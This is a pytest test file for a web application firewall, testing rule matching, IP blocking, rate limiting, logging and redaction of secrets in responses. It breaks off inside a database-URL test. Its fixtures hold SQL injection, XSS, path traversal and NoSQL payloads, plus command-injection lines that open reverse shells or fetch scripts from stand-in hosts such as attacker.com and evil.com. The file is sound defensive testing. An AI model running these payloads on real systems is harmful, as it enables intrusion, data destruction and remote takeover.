"""
Comprehensive tests for security WAF (Web Application Firewall) system
Tests the complete WAF infrastructure including:
- WAFConfig with default security rules and custom configuration loading
- WAFFilter with pattern matching and request blocking
- WAFRateLimiter with per-client and global rate limiting
- WAFLogger with event logging and file output
- WAFResponseFilter for sensitive data redaction
- OWASP Top 10 protection coverage and security rule validation
"""

import pytest
import os
import json
import time
import tempfile
import re
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, mock_open
from typing import Dict, List, Any

# Import all classes and data structures from the WAF module
try:
    from src.security.waf import (
        WAFRule,
        WAFResult,
        RateLimitResult,
        WAFConfig,
        WAFFilter,
        WAFRateLimiter,
        WAFLogger,
        WAFResponseFilter
    )
    WAF_AVAILABLE = True
except ImportError:
    # Skip all tests if the module is not available
    pytest.skip("WAF module not available", allow_module_level=True)


class TestWAFDataClasses:
    """Test WAF data classes and structures"""
    
    def test_waf_rule_creation(self):
        """Test WAFRule dataclass creation and pattern compilation"""
        rule = WAFRule(
            name="test_rule",
            pattern=r"test.*pattern",
            severity="high",
            action="block",
            description="Test security rule",
            enabled=True
        )
        
        assert rule.name == "test_rule"
        assert rule.pattern == r"test.*pattern"
        assert rule.severity == "high"
        assert rule.action == "block"
        assert rule.description == "Test security rule"
        assert rule.enabled is True
        assert rule.compiled_pattern is not None
        assert isinstance(rule.compiled_pattern, re.Pattern)
    
    def test_waf_rule_pattern_compilation(self):
        """Test automatic pattern compilation in WAFRule"""
        rule = WAFRule(
            name="sql_test",
            pattern=r"(SELECT|DROP|INSERT).*?(FROM|TABLE)",
            severity="critical",
            action="block",
            description="SQL injection test"
        )
        
        # Test pattern matching
        assert rule.compiled_pattern.search("SELECT * FROM users") is not None
        assert rule.compiled_pattern.search("DROP TABLE users") is not None
        assert rule.compiled_pattern.search("INSERT INTO users") is not None
        assert rule.compiled_pattern.search("NORMAL TEXT") is None
    
    def test_waf_rule_defaults(self):
        """Test WAFRule default values"""
        rule = WAFRule(
            name="minimal_rule",
            pattern="test",
            severity="low",
            action="log",
            description="Minimal rule"
        )
        
        assert rule.enabled is True  # Default value
        assert rule.compiled_pattern is not None
    
    def test_waf_result_creation(self):
        """Test WAFResult dataclass creation"""
        result = WAFResult(
            blocked=True,
            rule="sql_injection",
            severity="critical",
            message="SQL injection detected",
            matched_pattern=r"SELECT.*FROM"
        )
        
        assert result.blocked is True
        assert result.rule == "sql_injection"
        assert result.severity == "critical"
        assert result.message == "SQL injection detected"
        assert result.matched_pattern == r"SELECT.*FROM"
    
    def test_waf_result_defaults(self):
        """Test WAFResult default values"""
        result = WAFResult(blocked=False)
        
        assert result.blocked is False
        assert result.rule is None
        assert result.severity is None
        assert result.message is None
        assert result.matched_pattern is None
    
    def test_rate_limit_result_creation(self):
        """Test RateLimitResult dataclass creation"""
        result = RateLimitResult(
            allowed=True,
            remaining=45,
            retry_after=0,
            limit=60
        )
        
        assert result.allowed is True
        assert result.remaining == 45
        assert result.retry_after == 0
        assert result.limit == 60
    
    def test_rate_limit_result_defaults(self):
        """Test RateLimitResult default values"""
        result = RateLimitResult(allowed=False)
        
        assert result.allowed is False
        assert result.remaining == 0
        assert result.retry_after == 0
        assert result.limit == 0


class TestWAFConfig:
    """Test WAFConfig functionality"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.waf_config = WAFConfig()
    
    def test_waf_config_initialization(self):
        """Test WAF config initialization with default rules"""
        assert self.waf_config is not None
        assert self.waf_config.enabled is True
        assert isinstance(self.waf_config.rules, dict)
        assert len(self.waf_config.rules) > 0
    
    def test_default_security_rules(self):
        """Test that default security rules are loaded"""
        expected_rules = [
            "sql_injection",
            "xss_protection",
            "path_traversal",
            "command_injection",
            "xxe_protection",
            "ldap_injection",
            "nosql_injection",
            "header_injection",
            "malicious_file_upload",
            "protocol_injection",
            "privilege_escalation",
            "debug_mode_exposure",
            "version_disclosure",
            "weak_credentials",
            "log_tampering",
            "ssrf_protection"
        ]
        
        for rule_name in expected_rules:
            assert self.waf_config.has_rule(rule_name)
            rule = self.waf_config.get_rule(rule_name)
            assert rule is not None
            assert rule.enabled is True
            assert rule.compiled_pattern is not None
    
    def test_owasp_top_10_coverage(self):
        """Test coverage of OWASP Top 10 vulnerabilities"""
        # Map OWASP categories to rule names
        owasp_coverage = {
            "A01_Broken_Access_Control": ["privilege_escalation"],
            "A02_Cryptographic_Failures": [],  # Handled at application level
            "A03_Injection": ["sql_injection", "command_injection", "nosql_injection", "ldap_injection", "xxe_protection"],
            "A04_Insecure_Design": ["privilege_escalation"],
            "A05_Security_Misconfiguration": ["debug_mode_exposure"],
            "A06_Vulnerable_Components": ["version_disclosure"],
            "A07_Authentication_Failures": ["weak_credentials"],
            "A08_Software_Integrity_Failures": [],  # Handled at deployment level
            "A09_Security_Logging_Failures": ["log_tampering"],
            "A10_SSRF": ["ssrf_protection"]
        }
        
        # Verify rules exist for covered OWASP categories
        for category, rule_names in owasp_coverage.items():
            for rule_name in rule_names:
                assert self.waf_config.has_rule(rule_name), f"Missing rule {rule_name} for {category}"
    
    def test_sql_injection_rule_patterns(self):
        """Test SQL injection rule patterns"""
        sql_rule = self.waf_config.get_rule("sql_injection")
        assert sql_rule is not None
        
        # Test various SQL injection patterns
        sql_attacks = [
            "SELECT * FROM users WHERE id = 1; DROP TABLE users;",
            "1' OR '1'='1",
            "UNION SELECT password FROM admin_users",
            "'; EXEC xp_cmdshell('dir'); --",
            "WAITFOR DELAY '00:00:05'",
            "BENCHMARK(1000000,MD5(1))",
            "/**/SELECT/**/password/**/FROM/**/users",
            "0x41444D494E",  # Hex encoding
            "ＳＥＬＥＣＴ password FROM users"  # Unicode evasion
        ]
        
        for attack in sql_attacks:
            assert sql_rule.compiled_pattern.search(attack) is not None, f"Failed to detect: {attack}"
    
    def test_xss_protection_rule_patterns(self):
        """Test XSS protection rule patterns"""
        xss_rule = self.waf_config.get_rule("xss_protection")
        assert xss_rule is not None
        
        # Test various XSS attack patterns
        xss_attacks = [
            "<script>alert('XSS')</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'>",
            "javascript:alert('XSS')",
            "onload=alert('XSS')",
            "onclick=alert(1)",
            "alert(document.cookie)",
            "document.write('<script>alert(1)</script>')",
            "window.location='http://evil.com'"
        ]
        
        for attack in xss_attacks:
            assert xss_rule.compiled_pattern.search(attack) is not None, f"Failed to detect: {attack}"
    
    def test_command_injection_rule_patterns(self):
        """Test command injection rule patterns"""
        cmd_rule = self.waf_config.get_rule("command_injection")
        assert cmd_rule is not None
        
        # Test various command injection patterns
        cmd_attacks = [
            "test.txt; cat /etc/passwd",
            "file.txt && rm -rf /",
            "input | nc attacker.com 4444",
            "data `whoami`",
            "text $(id)",
            "file.txt; wget http://evil.com/shell.sh",
            "input; bash -i",
            "data; powershell -enc encoded_command",
            "text; IEX(New-Object Net.WebClient).DownloadString('http://evil.com')",
            "file; nohup nc -e /bin/bash attacker.com 4444"
        ]
        
        for attack in cmd_attacks:
            assert cmd_rule.compiled_pattern.search(attack) is not None, f"Failed to detect: {attack}"
    
    def test_path_traversal_rule_patterns(self):
        """Test path traversal rule patterns"""
        path_rule = self.waf_config.get_rule("path_traversal")
        assert path_rule is not None
        
        # Test various path traversal patterns
        traversal_attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../etc/passwd%00.txt",
            "..;/etc/passwd",
            "..%c0%af../etc/passwd",
            "....//....//etc/passwd",
            "..%5c..%5cwindows%5csystem32%5cconfig%5csam"
        ]
        
        for attack in traversal_attacks:
            assert path_rule.compiled_pattern.search(attack) is not None, f"Failed to detect: {attack}"
    
    def test_nosql_injection_rule_patterns(self):
        """Test NoSQL injection rule patterns"""
        nosql_rule = self.waf_config.get_rule("nosql_injection")
        assert nosql_rule is not None
        
        # Test various NoSQL injection patterns
        nosql_attacks = [
            '{"username": {"$ne": null}}',
            '{"password": {"$regex": ".*"}}',
            '{"$where": "this.username == this.password"}',
            'username[$ne]=admin&password[$ne]=admin',
            '{"username": ["admin"], "password": ["admin"]}',
            '{"$or": [{"username": "admin"}, {"role": "admin"}]}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"username": {"$exists": true}}'
        ]
        
        for attack in nosql_attacks:
            assert nosql_rule.compiled_pattern.search(attack) is not None, f"Failed to detect: {attack}"
    
    def test_is_enabled(self):
        """Test WAF enabled status checking"""
        assert self.waf_config.is_enabled() is True
        
        self.waf_config.enabled = False
        assert self.waf_config.is_enabled() is False
    
    def test_get_rules(self):
        """Test getting all WAF rules"""
        rules = self.waf_config.get_rules()
        assert isinstance(rules, list)
        assert len(rules) > 0
        
        # Verify all rules are WAFRule instances
        for rule in rules:
            assert isinstance(rule, WAFRule)
            assert hasattr(rule, 'name')
            assert hasattr(rule, 'pattern')
            assert hasattr(rule, 'compiled_pattern')
    
    def test_has_rule(self):
        """Test rule existence checking"""
        assert self.waf_config.has_rule("sql_injection") is True
        assert self.waf_config.has_rule("xss_protection") is True
        assert self.waf_config.has_rule("nonexistent_rule") is False
        assert self.waf_config.has_rule("") is False
    
    def test_get_rule(self):
        """Test getting specific rules"""
        sql_rule = self.waf_config.get_rule("sql_injection")
        assert sql_rule is not None
        assert sql_rule.name == "sql_injection"
        assert sql_rule.severity == "critical"
        assert sql_rule.action == "block"
        
        nonexistent = self.waf_config.get_rule("nonexistent")
        assert nonexistent is None
    
    def test_load_config_from_file(self):
        """Test loading configuration from file"""
        config_data = {
            "enabled": False,
            "rules": [
                {
                    "name": "custom_rule",
                    "pattern": r"custom.*pattern",
                    "severity": "medium",
                    "action": "log",
                    "description": "Custom test rule",
                    "enabled": True
                }
            ]
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(config_data, f)
            config_path = f.name
        
        try:
            waf_config = WAFConfig(config_path=config_path)
            
            # Verify configuration was loaded
            assert waf_config.enabled is False
            assert waf_config.has_rule("custom_rule")
            
            custom_rule = waf_config.get_rule("custom_rule")
            assert custom_rule.name == "custom_rule"
            assert custom_rule.severity == "medium"
            assert custom_rule.action == "log"
            
        finally:
            os.unlink(config_path)
    
    def test_load_config_file_not_found(self):
        """Test loading configuration with non-existent file"""
        with patch('src.security.waf.logger') as mock_logger:
            waf_config = WAFConfig(config_path="/nonexistent/config.json")
            
            # Should fall back to defaults
            assert waf_config.enabled is True
            assert len(waf_config.rules) > 0
            mock_logger.error.assert_called_once()
    
    def test_load_config_invalid_json(self):
        """Test loading configuration with invalid JSON"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write("invalid json content")
            config_path = f.name
        
        try:
            with patch('src.security.waf.logger') as mock_logger:
                waf_config = WAFConfig(config_path=config_path)
                
                # Should fall back to defaults
                assert waf_config.enabled is True
                assert len(waf_config.rules) > 0
                mock_logger.error.assert_called_once()
                
        finally:
            os.unlink(config_path)


class TestWAFFilter:
    """Test WAFFilter functionality"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.waf_filter = WAFFilter()
    
    def test_waf_filter_initialization(self):
        """Test WAF filter initialization"""
        assert self.waf_filter is not None
        assert hasattr(self.waf_filter, 'config')
        assert hasattr(self.waf_filter, 'blocked_ips')
        assert hasattr(self.waf_filter, 'alert_callbacks')
        assert isinstance(self.waf_filter.blocked_ips, set)
        assert isinstance(self.waf_filter.alert_callbacks, list)
    
    def test_check_request_disabled_waf(self):
        """Test request checking when WAF is disabled"""
        self.waf_filter.config.enabled = False
        
        malicious_request = {
            "query": "SELECT * FROM users WHERE id = 1; DROP TABLE users;"
        }
        
        result = self.waf_filter.check_request(malicious_request)
        assert result.blocked is False
    
    def test_check_request_sql_injection(self):
        """Test SQL injection detection"""
        sql_attacks = [
            {"query": "SELECT * FROM users WHERE id = 1; DROP TABLE users;"},
            {"input": "1' OR '1'='1"},
            {"param": "UNION SELECT password FROM admin_users"},
            {"data": "'; EXEC xp_cmdshell('dir'); --"},
            {"search": "/* comment */ SELECT password FROM users"}
        ]
        
        for attack_data in sql_attacks:
            result = self.waf_filter.check_request(attack_data)
            assert result.blocked is True, f"Failed to block SQL injection: {attack_data}"
            assert result.rule == "sql_injection"
            assert result.severity == "critical"
            assert "SQL injection" in result.message
    
    def test_check_request_xss_attack(self):
        """Test XSS attack detection"""
        xss_attacks = [
            {"content": "<script>alert('XSS')</script>"},
            {"input": "javascript:alert('XSS')"},
            {"data": "<iframe src='javascript:alert(1)'></iframe>"},
            {"comment": "onload=alert('XSS')"},
            {"payload": "document.write('<script>alert(1)</script>')"}
        ]
        
        for attack_data in xss_attacks:
            result = self.waf_filter.check_request(attack_data)
            assert result.blocked is True, f"Failed to block XSS: {attack_data}"
            assert result.rule == "xss_protection"
            assert result.severity == "high"
            assert "Cross-site scripting" in result.message
    
    def test_check_request_path_traversal(self):
        """Test path traversal detection"""
        traversal_attacks = [
            {"file": "../../../etc/passwd"},
            {"path": "..\\..\\..\\windows\\system32\\config\\sam"},
            {"filename": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
            {"upload": "....//....//etc/passwd"}
        ]
        
        for attack_data in traversal_attacks:
            result = self.waf_filter.check_request(attack_data)
            assert result.blocked is True, f"Failed to block path traversal: {attack_data}"
            assert result.rule == "path_traversal"
            assert result.severity == "high"
            assert "Path traversal" in result.message
    
    def test_check_request_command_injection(self):
        """Test command injection detection"""
        cmd_attacks = [
            {"input": "test.txt; cat /etc/passwd"},
            {"file": "data && rm -rf /"},
            {"param": "input | nc attacker.com 4444"},
            {"command": "file `whoami`"},
            {"payload": "data; bash -i"}
        ]
        
        for attack_data in cmd_attacks:
            result = self.waf_filter.check_request(attack_data)
            assert result.blocked is True, f"Failed to block command injection: {attack_data}"
            assert result.rule == "command_injection"
            assert result.severity == "critical"
            assert "Command injection" in result.message
    
    def test_check_request_nosql_injection(self):
        """Test NoSQL injection detection"""
        nosql_attacks = [
            {"filter": '{"username": {"$ne": null}}'},
            {"query": '{"password": {"$regex": ".*"}}'},
            {"search": '{"$where": "this.username == this.password"}'},
            {"data": '{"$or": [{"username": "admin"}, {"role": "admin"}]}'},
            {"params": '{"username": ["admin"], "password": ["admin"]}'}
        ]
        
        for attack_data in nosql_attacks:
            result = self.waf_filter.check_request(attack_data)
            assert result.blocked is True, f"Failed to block NoSQL injection: {attack_data}"
            assert result.rule == "nosql_injection"
            assert result.severity == "high"
            assert "NoSQL injection" in result.message
    
    def test_check_request_benign_data(self):
        """Test that benign requests are not blocked"""
        benign_requests = [
            {"username": "john_doe", "password": "secure_password123"},
            {"search_query": "machine learning algorithms"},
            {"file_content": "Hello world, this is a normal text file"},
            {"description": "This is a product description with normal text"},
            {"comment": "Great article about web security!"},
            {"name": "Alice", "email": "alice@example.com", "age": 30}
        ]
        
        for request_data in benign_requests:
            result = self.waf_filter.check_request(request_data)
            assert result.blocked is False, f"Incorrectly blocked benign request: {request_data}"
    
    def test_check_request_complex_data_structures(self):
        """Test checking complex data structures"""
        complex_request = {
            "user": {
                "name": "John Doe",
                "profile": {
                    "bio": "Software developer",
                    "skills": ["Python", "JavaScript", "SQL"]
                }
            },
            "preferences": ["security", "testing"],
            "metadata": {
                "created_at": "2023-01-01",
                "version": 1.0
            }
        }
        
        result = self.waf_filter.check_request(complex_request)
        assert result.blocked is False
        
        # Test with malicious data in nested structure
        malicious_complex = {
            "user": {
                "name": "Attacker",
                "query": "SELECT * FROM users; DROP TABLE users;"
            }
        }
        
        result = self.waf_filter.check_request(malicious_complex)
        assert result.blocked is True
        assert result.rule == "sql_injection"
    
    def test_check_request_with_none_values(self):
        """Test checking requests with None values"""
        request_with_none = {
            "valid_field": "normal data",
            "empty_field": None,
            "another_field": "more data"
        }
        
        result = self.waf_filter.check_request(request_with_none)
        assert result.blocked is False
    
    def test_check_ip_blocking(self):
        """Test IP address blocking functionality"""
        test_ip = "192.168.1.100"
        
        # Initially IP should not be blocked
        assert self.waf_filter.check_ip(test_ip) is False
        
        # Block the IP
        self.waf_filter.block_ip(test_ip, duration=3600)
        
        # Now IP should be blocked
        assert self.waf_filter.check_ip(test_ip) is True
        assert test_ip in self.waf_filter.blocked_ips
    
    def test_unblock_ip(self):
        """Test IP address unblocking"""
        test_ip = "192.168.1.101"
        
        # Block and then unblock IP
        self.waf_filter.block_ip(test_ip)
        assert self.waf_filter.check_ip(test_ip) is True
        
        self.waf_filter.unblock_ip(test_ip)
        assert self.waf_filter.check_ip(test_ip) is False
        assert test_ip not in self.waf_filter.blocked_ips
    
    def test_unblock_nonexistent_ip(self):
        """Test unblocking non-existent IP"""
        # Should not raise an error
        self.waf_filter.unblock_ip("192.168.1.999")
        assert len(self.waf_filter.blocked_ips) == 0
    
    def test_alert_callback_registration(self):
        """Test alert callback registration and execution"""
        callback_called = []
        
        def test_callback(rule, request_data):
            callback_called.append((rule.name, request_data))
        
        self.waf_filter.register_alert_callback(test_callback)
        assert len(self.waf_filter.alert_callbacks) == 1
        
        # Create a rule that triggers alerts
        alert_rule = WAFRule(
            name="test_alert",
            pattern="alert_trigger",
            severity="medium",
            action="alert",
            description="Test alert rule"
        )
        self.waf_filter.config.rules["test_alert"] = alert_rule
        
        # Send request that should trigger alert
        request_data = {"test": "alert_trigger"}
        result = self.waf_filter.check_request(request_data)
        
        # Verify callback was called
        assert len(callback_called) == 1
        assert callback_called[0][0] == "test_alert"
        assert callback_called[0][1] == request_data
    
    def test_alert_callback_exception_handling(self):
        """Test alert callback exception handling"""
        def failing_callback(rule, request_data):
            raise Exception("Callback failed")
        
        self.waf_filter.register_alert_callback(failing_callback)
        
        # Create alert rule
        alert_rule = WAFRule(
            name="test_alert",
            pattern="alert_trigger",
            severity="medium",
            action="alert",
            description="Test alert rule"
        )
        self.waf_filter.config.rules["test_alert"] = alert_rule
        
        # Should not raise exception even if callback fails
        with patch('src.security.waf.logger') as mock_logger:
            result = self.waf_filter.check_request({"test": "alert_trigger"})
            mock_logger.error.assert_called_once()
    
    def test_log_action_rules(self):
        """Test rules with log action"""
        # Create log rule
        log_rule = WAFRule(
            name="test_log",
            pattern="log_trigger",
            severity="low",
            action="log",
            description="Test log rule"
        )
        self.waf_filter.config.rules["test_log"] = log_rule
        
        with patch('src.security.waf.logger') as mock_logger:
            result = self.waf_filter.check_request({"test": "log_trigger"})
            
            # Request should not be blocked, but should be logged
            assert result.blocked is False
            mock_logger.info.assert_called_once()


class TestWAFRateLimiter:
    """Test WAFRateLimiter functionality"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.rate_limiter = WAFRateLimiter(
            requests_per_minute=60,
            burst_size=10,
            global_requests_per_minute=1000
        )
    
    def test_rate_limiter_initialization(self):
        """Test rate limiter initialization"""
        assert self.rate_limiter is not None
        assert self.rate_limiter.requests_per_minute == 60
        assert self.rate_limiter.burst_size == 10
        assert self.rate_limiter.global_requests_per_minute == 1000
        assert hasattr(self.rate_limiter, 'request_counts')
        assert hasattr(self.rate_limiter, 'blocked_clients')
        assert hasattr(self.rate_limiter, 'global_requests')
    
    def test_check_rate_limit_normal_usage(self):
        """Test rate limiting under normal usage"""
        client_id = "client_001"
        
        # Make several requests within limits
        for i in range(5):
            result = self.rate_limiter.check_rate_limit(client_id)
            assert result.allowed is True
            assert result.remaining == 60 - i - 1
            assert result.retry_after == 0
            assert result.limit == 60
    
    def test_check_rate_limit_exceeded(self):
        """Test rate limiting when limit is exceeded"""
        client_id = "client_002"
        
        # Make requests up to the limit
        for i in range(60):
            result = self.rate_limiter.check_rate_limit(client_id)
            assert result.allowed is True
        
        # Next request should be blocked
        result = self.rate_limiter.check_rate_limit(client_id)
        assert result.allowed is False
        assert result.remaining == 0
        assert result.retry_after == 60
        assert result.limit == 60
        
        # Client should be in blocked list
        assert client_id in self.rate_limiter.blocked_clients
    
    def test_check_rate_limit_burst_protection(self):
        """Test burst protection"""
        client_id = "client_003"
        
        # Make burst requests quickly
        for i in range(10):
            result = self.rate_limiter.check_rate_limit(client_id)
            assert result.allowed is True
        
        # Next request should trigger burst protection
        result = self.rate_limiter.check_rate_limit(client_id)
        assert result.allowed is False
        assert result.retry_after == 1  # Short burst delay
    
    def test_check_rate_limit_temporary_block_expiry(self):
        """Test that temporary blocks expire"""
        client_id = "client_004"
        
        # Trigger rate limit
        for i in range(61):
            self.rate_limiter.check_rate_limit(client_id)
        
        # Should be blocked
        result = self.rate_limiter.check_rate_limit(client_id)
        assert result.allowed is False
        
        # Simulate time passing by manipulating the blocked_clients dict
        # Set block time to past
        past_time = time.time() - 70  # 70 seconds ago
        self.rate_limiter.blocked_clients[client_id] = past_time
        
        # Should be unblocked now
        result = self.rate_limiter.check_rate_limit(client_id)
        assert result.allowed is True
        assert client_id not in self.rate_limiter.blocked_clients
    
    def test_global_rate_limit(self):
        """Test global rate limiting"""
        # Fill up global requests to near limit
        for i in range(999):
            self.rate_limiter.global_requests.append(time.time())
        
        # Next request should trigger global rate limit
        result = self.rate_limiter.check_rate_limit("any_client")
        assert result.allowed is False
        assert result.retry_after == 60
    
    def test_request_count_cleanup(self):
        """Test that old request counts are cleaned up"""
        client_id = "client_005"
        current_time = time.time()
        
        # Add old timestamps (older than 1 minute)
        old_timestamps = [current_time - 120, current_time - 90, current_time - 70]
        self.rate_limiter.request_counts[client_id] = old_timestamps
        
        # Add recent timestamp
        recent_timestamp = current_time - 30
        self.rate_limiter.request_counts[client_id].append(recent_timestamp)
        
        # Make a request - should clean up old timestamps
        with patch('time.time', return_value=current_time):
            result = self.rate_limiter.check_rate_limit(client_id)
        
        # Should only have recent timestamps left
        remaining_timestamps = self.rate_limiter.request_counts[client_id]
        assert len(remaining_timestamps) == 2  # recent + new request
        assert all(ts > current_time - 60 for ts in remaining_timestamps)
    
    def test_reset_client(self):
        """Test resetting rate limits for a client"""
        client_id = "client_006"
        
        # Generate some requests and block the client
        for i in range(61):
            self.rate_limiter.check_rate_limit(client_id)
        
        # Verify client is blocked
        assert client_id in self.rate_limiter.blocked_clients
        assert len(self.rate_limiter.request_counts[client_id]) > 0
        
        # Reset the client
        self.rate_limiter.reset_client(client_id)
        
        # Verify client is unblocked and counts are reset
        assert client_id not in self.rate_limiter.blocked_clients
        assert client_id not in self.rate_limiter.request_counts
        
        # Should be able to make requests normally
        result = self.rate_limiter.check_rate_limit(client_id)
        assert result.allowed is True
    
    def test_multiple_clients_isolation(self):
        """Test that rate limits are isolated per client"""
        client1 = "client_007"
        client2 = "client_008"
        
        # Fill up client1's limit
        for i in range(60):
            result = self.rate_limiter.check_rate_limit(client1)
            assert result.allowed is True
        
        # Client1 should be at limit
        result = self.rate_limiter.check_rate_limit(client1)
        assert result.allowed is False
        
        # Client2 should still be able to make requests
        result = self.rate_limiter.check_rate_limit(client2)
        assert result.allowed is True
        assert result.remaining == 59  # Fresh client


class TestWAFLogger:
    """Test WAFLogger functionality"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.waf_logger = WAFLogger()
    
    def test_waf_logger_initialization(self):
        """Test WAF logger initialization"""
        assert self.waf_logger is not None
        assert hasattr(self.waf_logger, 'log_file')
        assert hasattr(self.waf_logger, 'events')
        assert self.waf_logger.log_file is None
        assert isinstance(self.waf_logger.events, list)
        assert len(self.waf_logger.events) == 0
    
    def test_log_blocked_request(self):
        """Test logging blocked requests"""
        timestamp = datetime.utcnow()
        request_data = {"query": "SELECT * FROM users"}
        
        self.waf_logger.log_blocked_request(
            client_ip="192.168.1.100",
            rule_name="sql_injection",
            severity="critical",
            request_data=request_data,
            timestamp=timestamp
        )
        
        assert len(self.waf_logger.events) == 1
        
        event = self.waf_logger.events[0]
        assert event["timestamp"] == timestamp
        assert event["event_type"] == "request_blocked"
        assert event["client_ip"] == "192.168.1.100"
        assert event["rule_name"] == "sql_injection"
        assert event["severity"] == "critical"
        assert event["request_data"] == request_data
    
    def test_log_blocked_request_default_timestamp(self):
        """Test logging blocked requests with default timestamp"""
        before_time = datetime.utcnow()
        
        self.waf_logger.log_blocked_request(
            client_ip="192.168.1.101",
            rule_name="xss_protection",
            severity="high",
            request_data={"input": "<script>alert('xss')</script>"}
        )
        
        after_time = datetime.utcnow()
        
        event = self.waf_logger.events[0]
        assert before_time <= event["timestamp"] <= after_time
    
    def test_log_rate_limit(self):
        """Test logging rate limit events"""
        timestamp = datetime.utcnow()
        
        self.waf_logger.log_rate_limit(
            client_id="client_001",
            requests_count=65,
            limit=60,
            timestamp=timestamp
        )
        
        assert len(self.waf_logger.events) == 1
        
        event = self.waf_logger.events[0]
        assert event["timestamp"] == timestamp
        assert event["event_type"] == "rate_limit_exceeded"
        assert event["client_id"] == "client_001"
        assert event["requests_count"] == 65
        assert event["limit"] == 60
    
    def test_get_recent_events_all(self):
        """Test getting all recent events"""
        # Add multiple events
        self.waf_logger.log_blocked_request("192.168.1.1", "sql_injection", "critical", {})
        self.waf_logger.log_blocked_request("192.168.1.2", "xss_protection", "high", {})
        self.waf_logger.log_rate_limit("client_001", 65, 60)
        
        events = self.waf_logger.get_recent_events()
        assert len(events) == 3
    
    def test_get_recent_events_filtered(self):
        """Test getting filtered recent events"""
        # Add different types of events
        self.waf_logger.log_blocked_request("192.168.1.1", "sql_injection", "critical", {})
        self.waf_logger.log_blocked_request("192.168.1.2", "xss_protection", "high", {})
        self.waf_logger.log_rate_limit("client_001", 65, 60)
        self.waf_logger.log_rate_limit("client_002", 70, 60)
        
        # Filter for blocked requests only
        blocked_events = self.waf_logger.get_recent_events(event_type="request_blocked")
        assert len(blocked_events) == 2
        assert all(e["event_type"] == "request_blocked" for e in blocked_events)
        
        # Filter for rate limit events only
        rate_limit_events = self.waf_logger.get_recent_events(event_type="rate_limit_exceeded")
        assert len(rate_limit_events) == 2
        assert all(e["event_type"] == "rate_limit_exceeded" for e in rate_limit_events)
    
    def test_get_recent_events_with_limit(self):
        """Test getting recent events with limit"""
        # Add 5 events
        for i in range(5):
            self.waf_logger.log_blocked_request(f"192.168.1.{i}", "test_rule", "low", {})
        
        # Get only 3 most recent
        recent_events = self.waf_logger.get_recent_events(limit=3)
        assert len(recent_events) == 3
        
        # Should be the last 3 events (most recent)
        expected_ips = ["192.168.1.2", "192.168.1.3", "192.168.1.4"]
        actual_ips = [event["client_ip"] for event in recent_events]
        assert actual_ips == expected_ips
    
    def test_log_file_writing(self):
        """Test writing events to log file"""
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            log_file_path = f.name
        
        try:
            waf_logger = WAFLogger(log_file=log_file_path)
            
            # Log an event
            waf_logger.log_blocked_request(
                client_ip="192.168.1.100",
                rule_name="sql_injection",
                severity="critical",
                request_data={"query": "malicious_query"}
            )
            
            # Verify file was written
            assert os.path.exists(log_file_path)
            
            with open(log_file_path, 'r') as f:
                log_content = f.read().strip()
                assert log_content
                
                # Parse JSON
                event_data = json.loads(log_content)
                assert event_data["client_ip"] == "192.168.1.100"
                assert event_data["rule_name"] == "sql_injection"
                
        finally:
            if os.path.exists(log_file_path):
                os.unlink(log_file_path)
    
    def test_log_file_writing_error(self):
        """Test handling of log file writing errors"""
        waf_logger = WAFLogger(log_file="/invalid/path/log.txt")
        
        with patch('src.security.waf.logger') as mock_logger:
            # Should not raise exception even if file writing fails
            waf_logger.log_blocked_request("192.168.1.1", "test_rule", "low", {})
            
            # Should log the error
            mock_logger.error.assert_called_once()
    
    def test_system_logging_integration(self):
        """Test integration with system logger"""
        with patch('src.security.waf.logger') as mock_logger:
            # Test blocked request logging
            self.waf_logger.log_blocked_request(
                client_ip="192.168.1.100",
                rule_name="sql_injection",
                severity="critical",
                request_data={}
            )
            
            mock_logger.warning.assert_called_once()
            warning_call = mock_logger.warning.call_args[0][0]
            assert "192.168.1.100" in warning_call
            assert "sql_injection" in warning_call
            
            # Reset mock
            mock_logger.reset_mock()
            
            # Test rate limit logging
            self.waf_logger.log_rate_limit("client_001", 65, 60)
            
            mock_logger.warning.assert_called_once()
            warning_call = mock_logger.warning.call_args[0][0]
            assert "client_001" in warning_call
            assert "65/60" in warning_call


class TestWAFResponseFilter:
    """Test WAFResponseFilter functionality"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.response_filter = WAFResponseFilter()
    
    def test_response_filter_initialization(self):
        """Test response filter initialization"""
        assert self.response_filter is not None
        assert hasattr(self.response_filter, 'sensitive_patterns')
        assert hasattr(self.response_filter, 'compiled_patterns')
        assert len(self.response_filter.sensitive_patterns) > 0
        assert len(self.response_filter.compiled_patterns) > 0
    
    def test_filter_response_clean_data(self):
        """Test filtering response with clean data"""
        clean_response = """
        {
            "status": "success",
            "data": {
                "users": [
                    {"name": "John Doe", "email": "john@example.com"},
                    {"name": "Jane Smith", "email": "jane@example.com"}
                ],
                "total": 2
            }
        }
        """
        
        filtered, has_sensitive = self.response_filter.filter_response(clean_response)
        assert has_sensitive is False
        assert filtered == clean_response  # No changes
    
    def test_filter_response_api_keys(self):
        """Test filtering response with API keys"""
        response_with_api_key = """
        {
            "config": {
                "api_key": "sk-1234567890abcdef1234567890abcdef",
                "api_secret": "secret_abc123def456",
                "database_url": "mongodb://user:pass@localhost:27017/db"
            }
        }
        """
        
        filtered, has_sensitive = self.response_filter.filter_response(response_with_api_key)
        assert has_sensitive is True
        assert "sk-1234567890abcdef1234567890abcdef" not in filtered
        assert "secret_abc123def456" not in filtered
        assert "[REDACTED]" in filtered
    
    def test_filter_response_database_urls(self):
        """Test filtering response with database connection strings"""
        response_with_db_urls = """
        Database connections:
        - mongodb://admin:password123@cluster.mongodb.net/production
        - postgres://user:secret@localhost:5432/app_db
        - mysql://root:password@db.example.com:3306/main
